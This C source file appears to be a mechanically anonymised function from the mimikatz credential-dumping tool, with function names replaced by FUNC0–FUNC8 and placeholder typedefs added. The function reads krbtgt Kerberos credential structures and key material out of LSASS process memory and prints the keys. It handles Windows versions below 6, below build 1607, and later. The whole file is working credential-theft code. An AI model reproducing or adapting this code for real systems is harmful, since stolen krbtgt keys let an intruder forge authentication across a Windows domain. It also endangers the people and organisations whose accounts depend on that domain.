#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_21__   TYPE_7__ ;
typedef  struct TYPE_20__   TYPE_3__ ;
typedef  struct TYPE_19__   TYPE_2__ ;
typedef  struct TYPE_18__   TYPE_1__ ;
typedef  struct TYPE_17__   TYPE_15__ ;

/* Type definitions */
struct TYPE_21__ {TYPE_3__* address; int /*<<< orphan*/ * member_1; TYPE_3__* member_0; } ;
struct TYPE_20__ {int cbCred; TYPE_2__* credentials; } ;
struct TYPE_19__ {int /*<<< orphan*/  size; TYPE_3__* key; int /*<<< orphan*/  type; } ;
struct TYPE_18__ {int MajorVersion; scalar_t__ BuildNumber; } ;
struct TYPE_17__ {TYPE_1__ osContext; int /*<<< orphan*/ * hLsassMem; } ;
typedef  TYPE_3__* PVOID ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_6 ;
typedef  TYPE_3__* PKIWI_KRBTGT_CREDENTIALS_5 ;
typedef  int /*<<< orphan*/  PCWSTR ;
typedef  TYPE_7__ KULL_M_MEMORY_ADDRESS ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_64 ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_6 ;
typedef  int /*<<< orphan*/  KIWI_KRBTGT_CREDENTIAL_5 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_64 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_6 ;
typedef  TYPE_3__ KIWI_KRBTGT_CREDENTIALS_5 ;
typedef  size_t DWORD ;

/* Variables and functions */
 int /*<<< orphan*/  KULL_M_MEMORY_GLOBAL_OWN_HANDLE ; 
 scalar_t__ KULL_M_WIN_BUILD_10_1607 ; 
 int /*<<< orphan*/  LPTR ; 
 void* FUNC0 (int /*<<< orphan*/ ,size_t) ; 
 int /*<<< orphan*/  FUNC1 (TYPE_3__*) ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ) ; 
 size_t FUNC3 (int /*<<< orphan*/ ) ; 
 TYPE_15__ cLsass ; 
 int /*<<< orphan*/  FUNC4 (char*,...) ; 
 int /*<<< orphan*/  FUNC5 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC6 (TYPE_7__*,TYPE_7__*,size_t) ; 
 int /*<<< orphan*/  FUNC7 (TYPE_3__*,size_t,int /*<<< orphan*/ ) ; 

void FUNC8(PVOID addr, PCWSTR prefix)
{
	DWORD sizeForCreds, i;
	KIWI_KRBTGT_CREDENTIALS_64 tmpCred64, *creds64;
	KIWI_KRBTGT_CREDENTIALS_6 tmpCred6, *creds6;
	KIWI_KRBTGT_CREDENTIALS_5 tmpCred5, *creds5;
	KULL_M_MEMORY_ADDRESS aLsass = {addr, cLsass.hLsassMem}, aLocal = {&tmpCred6, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE};

	if(addr)
	{
		FUNC4(L"\n%s krbtgt: ", prefix);
		if(cLsass.osContext.MajorVersion < 6) // TODO: a field offset table
		{
			aLocal.address = &tmpCred5;
			if(FUNC6(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_5) - sizeof(KIWI_KRBTGT_CREDENTIAL_5)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_5) + (tmpCred5.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_5);
				if((creds5 = (PKIWI_KRBTGT_CREDENTIALS_5) FUNC0(LPTR, sizeForCreds)))
				{
					aLocal.address = creds5;
					if(FUNC6(&aLocal, &aLsass, sizeForCreds))
					{
						FUNC4(L"%u credentials\n", creds5->cbCred);
						for(i = 0; i < creds5->cbCred; i++)
						{
							FUNC4(L"\t * %s : ", FUNC5(FUNC2(creds5->credentials[i].type)));
							aLsass.address = creds5->credentials[i].key;
							if((aLocal.address = FUNC0(LPTR, FUNC3(creds5->credentials[i].size))))
							{
								if(FUNC6(&aLocal, &aLsass, FUNC3(creds5->credentials[i].size)))
									FUNC7(aLocal.address, FUNC3(creds5->credentials[i].size), 0);
								FUNC1(aLocal.address);
							}
							FUNC4(L"\n");
						}
					}
					FUNC1(creds5);
				}
			}
		}
		else if(cLsass.osContext.BuildNumber < KULL_M_WIN_BUILD_10_1607)
		{
			aLocal.address = &tmpCred6;
			if(FUNC6(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_6) - sizeof(KIWI_KRBTGT_CREDENTIAL_6)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_6) + (tmpCred6.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_6);
				if((creds6 = (PKIWI_KRBTGT_CREDENTIALS_6) FUNC0(LPTR, sizeForCreds)))
				{
					aLocal.address = creds6;
					if(FUNC6(&aLocal, &aLsass, sizeForCreds))
					{
						FUNC4(L"%u credentials\n", creds6->cbCred);
						for(i = 0; i < creds6->cbCred; i++)
						{
							FUNC4(L"\t * %s : ", FUNC5(FUNC2(creds6->credentials[i].type)));
							aLsass.address = creds6->credentials[i].key;
							if((aLocal.address = FUNC0(LPTR, FUNC3(creds6->credentials[i].size))))
							{
								if(FUNC6(&aLocal, &aLsass, FUNC3(creds6->credentials[i].size)))
									FUNC7(aLocal.address, FUNC3(creds6->credentials[i].size), 0);
								FUNC1(aLocal.address);
							}
							FUNC4(L"\n");
						}
					}
					FUNC1(creds6);
				}
			}
		}
		else
		{
			aLocal.address = &tmpCred64;
			if(FUNC6(&aLocal, &aLsass, sizeof(KIWI_KRBTGT_CREDENTIALS_64) - sizeof(KIWI_KRBTGT_CREDENTIAL_64)))
			{
				sizeForCreds = sizeof(KIWI_KRBTGT_CREDENTIALS_64) + (tmpCred64.cbCred - 1) * sizeof(KIWI_KRBTGT_CREDENTIAL_64);
				if((creds64 = (PKIWI_KRBTGT_CREDENTIALS_64) FUNC0(LPTR, sizeForCreds)))
				{
					aLocal.address = creds64;
					if(FUNC6(&aLocal, &aLsass, sizeForCreds))
					{
						FUNC4(L"%u credentials\n", creds64->cbCred);
						for(i = 0; i < creds64->cbCred; i++)
						{
							FUNC4(L"\t * %s : ", FUNC5(FUNC2(creds64->credentials[i].type)));
							aLsass.address = creds64->credentials[i].key;
							if((aLocal.address = FUNC0(LPTR, FUNC3(creds64->credentials[i].size))))
							{
								if(FUNC6(&aLocal, &aLsass, FUNC3(creds64->credentials[i].size)))
									FUNC7(aLocal.address, FUNC3(creds64->credentials[i].size), 0);
								FUNC1(aLocal.address);
							}
							FUNC4(L"\n");
						}
					}
					FUNC1(creds64);
				}
			}
		}
	}
}